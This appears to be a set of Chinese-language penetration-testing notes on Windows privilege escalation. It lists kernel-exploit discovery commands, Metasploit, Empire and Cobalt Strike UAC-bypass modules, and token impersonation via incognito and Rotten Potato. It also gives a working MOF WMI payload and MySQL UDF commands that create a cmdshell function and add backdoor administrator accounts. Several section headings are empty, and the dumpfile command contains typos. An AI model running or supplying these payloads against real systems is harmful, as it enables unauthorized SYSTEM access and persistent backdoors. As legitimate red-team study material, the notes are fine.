[参考指南](https://cloud.tencent.com/developer/article/1771226)

## 系统内核溢出提权

查看系统补丁

```
#手工查找补丁
systeminfo
Wmic qfe get Caption,Description,HotFixID,InstalledOn

#MSF后渗透扫描
post/windows/gather/enum_patches 
post/multi/recon/local_exploit_suggester

#Windows exploit suggester
https://github.com/AonCyberLabs/Windows-Exploit-Suggester
https://github.com/jondonas/linux-exploit-suggester-2

#powershell中的sherlock脚本 
Import-Module C:\Sherlock.ps1 #下载ps1脚本，导入模块 
Find-AllVulns 

#Empire内置模块 Empire框架也提供了关于内核溢出漏洞提权的漏洞利用方法 
usemodule privesc/powerup/allchecks 
execute
```
查找到缺失的补丁后，对照相应的系统版本，查找对应的exp
```
https://github.com/SecWiki/windows-kernel-exploits 
https://bugs.hacking8.com/tiquan/ https://github.com/Heptagrams/Heptagram/tree/master/Windows/Elevation https://www.exploit-db.com/ 
https://i.hacking8.com/tiquan/
```
## 系统配置错误提权






## 组策略首选项提权






## BypassUAC提权

UAC通过阻止程序执行任何涉及有关系统更改/特定任务的任务来运行。除非尝试执行这些操作的进程以管理员权限运行，否则这些操作将无法运行。如果您以管理员身份运行程序，则它将具有更多权限，因为它将被“提升权限”，而不是以管理员身份运行的程序。
```
#Msf 
exploit/windows/local/ask #弹出UAC确认窗口，点击后获得system权限 exploit/windows/local/bypassuac #此模块将通过进程注入使用可信任发布者证书绕过Windows UAC，它将生成关闭UAC标志的第二个shell。 
exploit/windows/local/bypassuac_injection #此模块将通过进程注入使用可信任的发布者证书绕过Windows UAC。它将生成关闭UAC标志的第二个shell。在普通技术中，该模块使用反射式DLL注入技术并只除去了DLL payload 二进制文件，而不是三个单独的二进制文件。但是，它需要选择正确的体系架构（对于SYSWOW64系统也使用x64）。如果指定exe::custom，应在单独的进程中启动 payload 后调用ExitProcess（） 
exploit/windows/local/bypassuac_fodhelper#此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入将在启动Windows fodhelper.exe应用程序时调用的自定义命令来绕过Windows 10 UAC。它将生成关闭UAC标志的第二个shell。此模块修改注册表项，但在调用payload后将清除该项。该模块不需要payload的体系架构和操作系统匹配。如果指定exe:custom，则应在单独的进程中启动payload后调用ExitProcess（）。 
exploit/windows/local/bypassuac_eventvwr#此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入将在启动Windows事件查看器时调用的自定义命令来绕过Windows UAC。它将生成关闭UAC标志的第二个shell。此模块修改注册表项，但在调用payload后将清除该项。该模块不需要payload的体系架构和操作系统匹配。如果指定EXE ::Custom，则应在单独的进程中启动payload后调用ExitProcess（） exploit/windows/local/bypassuac_comhijack#此模块将通过在hkcu配置单元中创建COM处理程序注册表项来绕过Windows UAC。当加载某些较高完整性级别进程时，会引用这些注册表项，从而导致进程加载用户控制的DLL,这些DLL包含导致会话权限提升的payload。此模块修改注册表项，但在调用payload后将清除该项,这个模块需要payload的体系架构和操作系统匹配，但是当前的低权限meterpreter会话体系架构中可能不同。如果指定exe:：custom，则应在单独的进程中启动payloa后调用ExitProcess（）。此模块通过目标上的cmd.exe调用目标二进制文件,因此，如果cmd.exe访问受到限制，此模块将无法正常运行。 

#Powershell 
Invoke-PsUACme 

#Empire 
usemodule privesc/bypassuac 
usemodule privesc/bypassuac_wscript 

#cs 
uac-dll 
uac-token-duplication 

```
## 令牌窃取

```
#MSF
use incognito #进入incognito模块 
list_tokens -u #列出令牌
Delegation Tokens Available #也就是授权令牌，它支持交互式登录(例如可以通过远程桌面登录访问)
========================================
GOD\Administrator
NT AUTHORITY\SYSTEM

Impersonation Tokens Available #模拟令牌，它是非交互的会话
========================================
No tokens available

#使用令牌假冒用户 
impersonate_token "NT AUTHORITY\SYSTEM"

# Rotten Potato 本地提权
https://link.zhihu.com/?target=https%3A//github.com/breenmachine/RottenPotatoNG
运行 RottenPotato.exe 直接弹出 SYSTEM 权限的 CMD 窗口，不需要用到 MSF
```

## 数据库提权

### MOF提权
MOF文件是mysql数据库的扩展文件（在c:/windows/system32/wbem/mof/nullevt.mof）叫做”托管对象格式”，其作用是每隔五秒就会去监控进程创建和死亡，因为MOF文件每五秒就会执行，且是系统权限，所以如果我们有权限替换原有的mof文件，就能获得system权限
```
#pragma namespace("\\\\.\\root\\subscription")

instance of __EventFilter as $EventFilter
{
EventNamespace = "Root\\Cimv2";
Name  = "filtP2";
Query = "Select * From __InstanceModificationEvent "
"Where TargetInstance Isa \"Win32_LocalTime\" "
"And TargetInstance.Second = 5";
QueryLanguage = "WQL";
};

instance of ActiveScriptEventConsumer as $Consumer
{
Name = "consPCSV2";
ScriptingEngine = "JScript";
ScriptText =
"var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user waitalone waitalone.cn /add\")";
};

instance of __FilterToConsumerBinding
{
Consumer   = $Consumer;
Filter = $EventFilter;
};
```

其中的第18行的命令，上传前请自己更改。

2、执行load_file及into dumpfile把文件导出到正确的位置即可。

```
select load file('c:/wmpub/nullevt.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mov'
```

执行成功后，即可添加一个普通用户，然后你可以更改命令，再上传导出执行把用户提升到管理员权限，然后3389连接之就ok了。


### UDF提权
UDF,user defined funcion,即用户自定义函数，用户可以通过自己增加函数对mysql功能进行扩充，文件后缀为.dll
要求: 1.目标系统是Windows(Win2000,XP,Win2003)； 2.拥有MYSQL的某个用户账号，此账号必须有对mysql的insert和delete权限以创建和抛弃函数 3.有root账号密码 导出udf: MYSQL 5.1以上版本，必须要把udf.dll文件放到MYSQL安装目录下的lib\plugin文件夹下才能创建自定义函数 可以再mysql里输入 `select @@basedir` `show variables like ‘%plugins%’` 寻找mysql安装路径 提权:

使用SQL语句创建功能函数。语法：Create Function 函数名（函数名只能为下面列表中的其中之一）returns string soname ‘导出的DLL路径’；

```
create function cmdshell returns string soname ‘udf.dll’
select cmdshell(‘net user arsch arsch /add’);
select cmdshell(‘net localgroup administrators arsch /add’);

drop function cmdshell;
```

该目录默认是不存在的，这就需要我们使用webshell找到MYSQL的安装目录，并在安装目录下创建lib\plugin文件夹，然后将udf.dll文件导出到该目录即可。

## 其他